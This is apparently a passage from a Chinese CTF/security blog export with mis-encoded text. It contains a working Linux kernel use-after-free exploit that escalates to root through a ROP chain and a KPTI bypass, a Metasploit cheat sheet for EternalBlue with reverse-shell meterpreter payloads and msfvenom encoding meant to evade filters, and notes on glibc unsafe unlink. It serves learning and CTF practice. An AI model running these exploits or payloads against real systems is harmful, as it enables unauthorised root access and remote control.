class="meta">#<span class="keyword">define</span> MMSG_UPDATE 0x4444444</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_PUT_DESC 0x5555555</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_GET_DESC 0x6666666</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> token;</span><br><span class="line">        <span class="type">int</span> top;</span><br><span class="line">        <span class="type">int</span> size;</span><br><span class="line">        <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> nokaslr = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff9248d790</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff8108d350</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff93000e30</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff811aa376</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff8264c9a0</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_iretq = <span class="number">0xffffffff81c00ec6</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0x168_ret = <span class="number">0xffffffff81909b8c</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> mmsg_fd;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploit</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line">    mmsg_fd = open(<span class="string">&quot;/dev/mmsg&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (mmsg_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.token = <span class="number">1</span>;</span><br><span class="line">    arg.top = <span class="number">1</span>;</span><br><span class="line">    arg.size = <span class="number">16</span>;</span><br><span class="line">    arg.data = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="type">size_t</span> *buf = (<span class="type">size_t</span> *)arg.data;</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0x1145141145141145</span>ull;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg);  <span class="comment">// bypass size check</span></span><br><span class="line">    ioctl(mmsg_fd, MMSG_RECV, &amp;arg);     <span class="comment">// free head</span></span><br><span class="line"></span><br><span class="line">    seq_fd = seq_open();</span><br><span class="line"></span><br><span class="line">    ioctl(mmsg_fd, MMSG_GET_DESC, &amp;arg);</span><br><span class="line">    log_warning(<span class="string">&quot;start leak info&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i ++) &#123;</span><br><span class="line">        log_debug(<span class="string">&quot;buf[%d] =&gt; 0x%lx\n&quot;</span>, i, buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = buf[<span class="number">0</span>] - <span class="number">0x20fac0</span>;</span><br><span class="line">    kernel_offset = kernel_base - nokaslr;</span><br><span class="line">    add_rsp_0x168_ret += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    swapgs_iretq += kernel_offset;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;kernel_offset =&gt; 0x%lx&quot;</span>, kernel_offset);</span><br><span class="line">    log_info(<span class="string">&quot;kernel_base =&gt; 0x%lx&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = add_rsp_0x168_ret;</span><br><span class="line">    log_info(<span class="string">&quot;pollute =&gt; 0x%lx, maybe we can debug here&quot;</span>, buf[<span class="number">0</span>]);</span><br><span class="line">    ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   pop_rdi_ret;&quot;</span>   <span class="comment">// &lt;- rip here</span></span><br><span class="line">        <span class="string">&quot;mov r13,   init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   swapgs_iretq;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    user_rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="comment">// è¿™é‡Œå‡å®šé€šè¿‡ seq_operations-&gt;stat æ¥è§¦å‘</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    exploit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>bypass kptiï¼Œä¿®æ”¹cr3ï¼Œåœ¨é«˜ç‰ˆæœ¬ä½¿ç”¨ï¼Œåœ¨ <code>+22</code> åœ°å€æ˜¯æˆ‘ä»¬åˆ©ç”¨çš„gadgetã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600A34 <span class="number">41</span> <span class="number">5F</span>                          pop     r15</span><br><span class="line">.text:FFFFFFFF81600A36 <span class="number">41</span> <span class="number">5</span>E                          pop     r14</span><br><span class="line">.text:FFFFFFFF81600A38 <span class="number">41</span> <span class="number">5</span>D                          pop     r13</span><br><span class="line">.text:FFFFFFFF81600A3A <span class="number">41</span> <span class="number">5</span>C                          pop     r12</span><br><span class="line">.text:FFFFFFFF81600A3C <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF81600A3D <span class="number">5B</span>                             pop     rbx</span><br><span class="line">.text:FFFFFFFF81600A3E <span class="number">41</span> <span class="number">5B</span>                          pop     r11</span><br><span class="line">.text:FFFFFFFF81600A40 <span class="number">41</span> <span class="number">5</span>A                          pop     r10</span><br><span class="line">.text:FFFFFFFF81600A42 <span class="number">41</span> <span class="number">59</span>                          pop     r9</span><br><span class="line">.text:FFFFFFFF81600A44 <span class="number">41</span> <span class="number">58</span>                          pop     r8</span><br><span class="line">.text:FFFFFFFF81600A46 <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600A47 <span class="number">59</span>                             pop     rcx</span><br><span class="line">.text:FFFFFFFF81600A48 <span class="number">5</span>A                             pop     rdx</span><br><span class="line">.text:FFFFFFFF81600A49 <span class="number">5</span>E                             pop     rsi</span><br><span class="line">.text:FFFFFFFF81600A4A <span class="number">48</span> <span class="number">89</span> E7                       mov     rdi, rsp    &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class="line">.text:FFFFFFFF81600A4D <span class="number">65</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">24</span> <span class="number">25</span>+                mov     rsp, gs: <span class="number">0x5004</span></span><br><span class="line">.text:FFFFFFFF81600A56 FF <span class="number">77</span> <span class="number">30</span>                       push    qword ptr [rdi+<span class="number">30</span>h]</span><br><span class="line">.text:FFFFFFFF81600A59 FF <span class="number">77</span> <span class="number">28</span>                       push    qword ptr [rdi+<span class="number">28</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5C FF <span class="number">77</span> <span class="number">20</span>                       push    qword ptr [rdi+<span class="number">20</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5F FF <span class="number">77</span> <span class="number">18</span>                       push    qword ptr [rdi+<span class="number">18</span>h]</span><br><span class="line">.text:FFFFFFFF81600A62 FF <span class="number">77</span> <span class="number">10</span>                       push    qword ptr [rdi+<span class="number">10</span>h]</span><br><span class="line">.text:FFFFFFFF81600A65 FF <span class="number">37</span>                          push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81600A67 <span class="number">50</span>                             push    rax</span><br><span class="line">.text:FFFFFFFF81600A68 EB <span class="number">43</span>                          nop</span><br><span class="line">.text:FFFFFFFF81600A6A <span class="number">0F</span> <span class="number">20</span> DF                       mov     rdi, cr3</span><br><span class="line">.text:FFFFFFFF81600A6D EB <span class="number">34</span>                          jmp     <span class="number">0xFFFFFFFF81600AA3</span></span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600AA3 <span class="number">48</span> <span class="number">81</span> CF <span class="number">00</span> <span class="number">10</span>+                or      rdi, <span class="number">1000</span>h</span><br><span class="line">.text:FFFFFFFF81600AAA <span class="number">0F</span> <span class="number">22</span> DF                       mov     cr3, rdi</span><br><span class="line">.text:FFFFFFFF81600AAD <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600AAE <span class="number">5F</span>                             pop     rdi</span><br><span class="line">.text:FFFFFFFF81600AAF FF <span class="number">15</span> <span class="number">23</span> <span class="number">65</span> <span class="number">62</span>+                call    cs: SWAPGS</span><br><span class="line">.text:FFFFFFFF81600AB5 FF <span class="number">25</span> <span class="number">15</span> <span class="number">65</span> <span class="number">62</span>+                jmp     cs: INTERRUPT_RETURN</span><br><span class="line"></span><br><span class="line">_SWAPGS</span><br><span class="line">.text:FFFFFFFF8103EFC0 <span class="number">55</span>                             push    rbp</span><br><span class="line">.text:FFFFFFFF8103EFC1 <span class="number">48</span> <span class="number">89</span> E5                       mov     rbp, rsp</span><br><span class="line">.text:FFFFFFFF8103EFC4 <span class="number">0F</span> <span class="number">01</span> F8                       swapgs</span><br><span class="line">.text:FFFFFFFF8103EFC7 <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF8103EFC8 C3                             retn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_INTERRUPT_RETURN</span><br><span class="line">.text:FFFFFFFF81600AE0 F6 <span class="number">44</span> <span class="number">24</span> <span class="number">20</span> <span class="number">04</span>                 test    byte ptr [rsp+<span class="number">0x20</span>], <span class="number">4</span></span><br><span class="line">.text:FFFFFFFF81600AE5 <span class="number">75</span> <span class="number">02</span>                          jnz     native_irq_return_ldt</span><br><span class="line">.text:FFFFFFFF81600AE7 <span class="number">48</span> CF                          iretq</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ«äººçš„åšæ³•ï¼Œå¥½åƒä¸éœ€è¦å…³æ³¨ripåé¢çš„å†…å®¹ï¼Œä½†æ˜¯æœ¬é¢˜æˆ‘æ²¡æœ‰ä½¿ç”¨è¿™ç§æ–¹å¼åšå‡ºæ¥ ğŸ‘€ã€‚</p>
<ul>
<li>æœ€åéœ€è¦æˆ‘ä»¬è°ƒç”¨getshellå‡½æ•°ã€‚</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   __asm__(</span><br><span class="line">       <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r14,   pop_rdi_ret;&quot;</span>   <span class="comment">// &lt;- rip here</span></span><br><span class="line">       <span class="string">&quot;mov r13,   init_cred;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r12,   commit_creds;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbp,   swapgs_restore_regs_and_return_to_usermode + 22;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r9,    user_rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">       <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>    </span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">get_shell();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>commit_creds(prepare_kernel_cred (0)) &#x3D;&gt; ç®€åŒ–ä¸º commit_creds(&amp;init_cred) init_cred: init è¿›ç¨‹çš„æƒé™ï¼Œä¸ºrootï¼Œåœ¨ <code>/proc/kallsyms</code> å†…</p>
<p>å¯»æ‰¾ gadget æ—¶å¯èƒ½å¯»æ‰¾åˆ°çš„gadgetä¸èƒ½ä½¿ç”¨ï¼ŒæŠ¥é”™ä¸º <code>kernel tried to execute NX-protected page</code>ï¼Œè¯´æ˜å…¶åœ°å€ä¸å¯è®¿é—®ï¼Ÿé‚£å°±åªèƒ½æ¢äº†</p>
<p>ä¸ºä»€ä¹ˆæ‰¾ä¸å¯¹gadget?æˆ–è€…æ ¹æœ¬æ²¡æœ‰æ‰¾åˆ°ğŸ¤¡ã€‚å’Œå‚è€ƒçš„çœ‹çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°gadgetåœ°å€æ ¹æœ¬å°±æ²¡æ‰¾å¯¹ã€‚</p>
<ul>
<li>ropper + ROPgadget + ropr ä¸‰ä¸ªå·¥å…·ä¸€èµ·ä½¿ç”¨ï¼Œè·å¾—ä¸‰ä¸ªgadgetæ–‡ä»¶ã€‚</li>
<li>extract-vmlinux + vmlinux-to-elf å·¥å…·</li>
</ul>
<p>å¦‚ä½•ä¸‹æ–­ç‚¹ï¼Ÿ</p>
<ul>
<li>åœ¨æƒ³æš‚åœçš„çš„åœ°æ–¹ä½¿ç”¨ <code>getchar()</code> åœæ­¢åä¸€è·¯si</li>
<li>åœ¨å›ºå®šçš„æŒ‡ä»¤åœ°å€ä¸‹æ–­ç‚¹ï¼Œä½†æ˜¯éœ€è¦äº‹å…ˆçŸ¥é“åœ°å€ã€‚ä½†æ˜¯ropæ—¶ï¼Œåœ°å€ä¸€èˆ¬éƒ½æ˜¯çŸ¥é“çš„ã€‚</li>
</ul>
<p>åœ¨å›ºå®šçš„æŒ‡ä»¤ä¸‹æ–­ç‚¹ï¼Œæ¯”å¦‚æ­¤é¢˜å°±å¯ä»¥åœ¨åœ¨ add rsp é‚£ä¸€æ¡æŒ‡ä»¤ä¸‹æ–­ç‚¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">   0xffffffff81909b8c    add    rsp, module_ioctl+56          &lt;0x168&gt;</span><br><span class="line">   0xffffffff81909b93    ret</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tele 0xffffc900001c7df8+0x168 </span><br><span class="line">00:0000 0xffffc900001c7f60 0x44444444 /* <span class="string">&#x27;DDDD&#x27;</span> */</span><br><span class="line">01:0008 0xffffc900001c7f68 0x33333333 /* <span class="string">&#x27;3333&#x27;</span> */</span><br><span class="line">02:0010 0xffffc900001c7f70 0x22222222 /* <span class="string">&#x27;&quot;&quot;&quot;&quot;&#x27;</span> */</span><br><span class="line">03:0018 0xffffc900001c7f78 0xbbbb1111</span><br><span class="line">04:0020 0xffffc900001c7f80 0xbbbb2222</span><br><span class="line">05:0028 0xffffc900001c7f88 0x246</span><br><span class="line">06:0030 0xffffc900001c7f90 0x11110000</span><br><span class="line">07:0038 0xffffc900001c7f98 0x99999999</span><br><span class="line">08:0040 0xffffc900001c7fa0 0x88888888</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>uaf</tag>
      </tags>
  </entry>
  <entry>
    <title>msf</title>
    <url>/2024/01/31/msf/</url>
    <content><![CDATA[<blockquote>
<p>Metasploit Framework ç®€å•ç”¨ç”¨</p>
</blockquote>
<span id="more"></span>

<h2 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ msfconsole</span><br><span class="line">msf6 &gt; search ms17_010                                                      <span class="comment"># å¯»æ‰¾ç›¸å…³</span></span><br><span class="line">msf6 &gt; use 1                                                                <span class="comment"># searchå‡ºçš„ç»“æœ</span></span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show payloads                   <span class="comment"># æ˜¾ç¤ºå¯ä»¥ä½¿ç”¨çš„payloads</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options                    <span class="comment"># exploit å‚æ•°</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> LHOST 192.168.41.148        <span class="comment"># è®¾ç½®å‚æ•°</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; exploit</span><br></pre></td></tr></table></figure>

<p>meterpreter æ“ä½œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; shell</span><br><span class="line">meterpreter&gt; background      <span class="comment"># è¿”å›msf</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; session -l    <span class="comment"># æ˜¾ç¤ºæ‰€æœ‰çš„session `session 0` é‡æ–° attach</span></span><br></pre></td></tr></table></figure>

<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>åé—¨ç”Ÿæˆï¼Œå…æ€</p>
<p>å¯»æ‰¾payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ msfvenom -l payload | grep linux</span><br><span class="line">$ msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆshellcode</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -p: payload</span></span><br><span class="line"><span class="comment"># -a: arch</span></span><br><span class="line"><span class="comment"># -f: format</span></span><br><span class="line">$ msfvenom -p linux/x86/meterpreter/reverse_tcp -a x86 --platform=linux LHOST=127.0.0.1 LPORT=9001 -f c</span><br></pre></td></tr></table></figure>

<p>encoderï¼šå¯ä»¥è¿‡æ‰éƒ¨åˆ†waf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ msfvenom --list encoders</span><br><span class="line"><span class="comment"># -e: encoder</span></span><br><span class="line"><span class="comment"># -i: iterationsï¼Œç¼–ç å¤šæ¬¡</span></span><br><span class="line">$ msfvenom -e php/base64 -i 10  </span><br></pre></td></tr></table></figure>

<h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><p>ç”Ÿæˆéšæœºå­—ç¬¦ä¸²</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ msf-pattern_create -l 100</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>unsafe-unlink</title>
    <url>/2023/09/13/unsafe%20unlink/</url>
    <content><![CDATA[<blockquote>
<p>ç»å…¸æ¼æ´</p>
</blockquote>
<span id="more"></span>

<h2 id="Glibc-unlink"><a href="#Glibc-unlink" class="headerlink" title="Glibc unlink"></a>Glibc unlink</h2><p>å½“ä¸€ä¸ª free chunk ä»åŒå‘é“¾è¡¨çš„ bins ä¸­å–å‡ºæ—¶ï¼ˆå †çš„åˆå¹¶ï¼‰ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯ unlinkã€‚</p>
<p>å †çš„åˆå¹¶ä¸»è¦çœ‹è¿™ä¸€æ®µä»£ç ï¼Œå­˜åœ¨ä¸¤ç§åˆå¹¶æ–¹å¼</p>
<ul>
<li>int_free å‚æ•°ï¼špæ˜¯æ­£åœ¨freeçš„chunkï¼Œav æŒ‡ arena(struct malloc_state)ï¼Œlocké¿å…æ¡ä»¶ç«äº‰</li>
<li>å‘ååˆå¹¶ï¼šprev_inuseä½ä¸º0ï¼Œä¼šå‘ç”Ÿunsorted binä¹‹é—´åˆå¹¶ï¼Œä¼šæ£€æŸ¥prev_size å’Œ æƒ³è¦åˆå¹¶çš„ bin çš„ size æ˜¯å¦ç›¸åŒã€‚unlink prev_chunk</li>
<li>å‘å‰åˆå¹¶ï¼šä¸æ˜¯top_chunk, unlink nextchunkã€‚</li>
<li>è‡³äºæ–¹å‘ï¼šåœ¨æ²¡æœ‰ç¿»è¯‘é”™è¯¯çš„æƒ…å†µä¸‹ï¼Œæœ‰ç‚¹ç»•ï¼Œä½†æ˜¯å¯ä»¥å¼ºè¡Œè§£é‡Šï¼Œå› ä¸ºå †å¾€é«˜åœ°å€ç”Ÿé•¿ï¼Œå‘å‰å°±æ˜¯å‘é«˜åœ°å€åˆå¹¶ï¼Œå‘åå°±æ˜¯å‘ä½åœ°å€åˆå¹¶ï¼Ÿ</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">prev_inuse</span>(p)) &#123;</span><br><span class="line">  prevsize = <span class="built_in">prev_size</span>(p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = <span class="built_in">chunk_at_offset</span>(p, -((<span class="type">long</span>)prevsize));         <span class="comment">// p = p-prevsize,å°±æ˜¯å‰é¢çš„ chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">chunksize</span>(p) != prevsize))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  <span class="built_in">unlink_chunk</span>(av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nextchunk = chunk_at_offset(p, size);  å°±æ˜¯æ ¹æ®sizeè¿›è¡ŒåŠ æ³•ï¼Œæ˜¯ä¸€ä¸ªå®ï¼Œå°±æ˜¯å½“å‰chunkçš„ä¸‹ä¸€ä¸ªchunk</span></span><br><span class="line"><span class="comment">// nextsize = chunksize(nextchunk); </span></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">  nextinuse = <span class="built_in">inuse_bit_at_offset</span>(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">  <span class="built_in">unlink_chunk</span>(av, nextchunk);    <span class="comment">// å½“å‰çš„ arena å’Œ next_chunk ä½¿ç”¨æŒ‡é’ˆè¿æ¥</span></span><br><span class="line">  size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">  <span class="built_in">clear_inuse_bit_at_offset</span>(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>unlinkå‡½æ•°ä¸»è¦æ˜¯æŒ‡é’ˆçš„å¤„ç†ï¼Œå‡è®¾3ä¸ªchunkï¼Œa-b-cï¼Œa-båœ¨unsortedbin èŒƒå›´ï¼Œcä¸»è¦é˜²æ­¢top_chunkåˆå¹¶ï¼Œæ­£å¸¸æƒ…å†µä¸‹</p>
<ul>
<li>é¦–å…ˆï¼Œunsorted bin æŒ‰ç…§freeæ—¶é—´é¡ºåºè¿æ¥ï¼ŒfdæŒ‡å‘æ—¶é—´é å‰çš„chunkã€‚</li>
<li>å‘å‰åˆå¹¶ï¼šfree b, free aã€‚å…ˆæˆä¸º arena&lt;-&gt;b åŒé“¾è¡¨ï¼Œç„¶ååœ¨è°ƒç”¨ unlink(av, b)ã€‚</li>
<li>å‘ååˆå¹¶ï¼šfree a, free bã€‚å…ˆæˆä¸º arena&lt;-&gt;a åŒé“¾è¡¨ åœ¨int_free è°ƒç”¨çš„æ˜¯ unlink(av, a)ã€‚</li>
<li>è¿™é‡Œå°±ä½¿ç”¨å‘ååˆå¹¶ä¸¾ä¾‹ï¼šfd&#x3D;a-&gt;fd&#x3D;arena, bk&#x3D;a-&gt;bk&#x3D;arenaï¼›åœ¨ç»å†ä¸€ä¸ªèµ‹å€¼è¯­å¥å˜ä¸º arena-&gt;bk&#x3D;arenaï¼Œareba-&gt;fd&#x3D;arenaã€‚ä»arena&lt;-&gt;a å˜æˆäº† arena å®Œæˆunlinkæ­¤æ“ä½œã€‚</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">unlink_chunk</span><span class="params">(mstate av, mchunkptr p)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">chunksize</span>(p) != <span class="built_in">prev_size</span>(<span class="built_in">next_chunk</span>(p)))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(<span class="built_in">chunksize_nomask</span>(p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">      <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">        fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">        fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">        p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">        p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååç»­ç»§ç»­è¿›å…¥freeå‡½æ•°é‡Œæ“ä½œ</p>
<ul>
<li>åç»­æ“ä½œï¼šæ­¤æ—¶pæŒ‡å‘aï¼Œæ‰¾åˆ°arenaçš„binsæ•°ç»„ï¼Œç„¶åé“¾å…¥arenaï¼Œè®¾ç½®headå’Œfoot</li>
</ul>
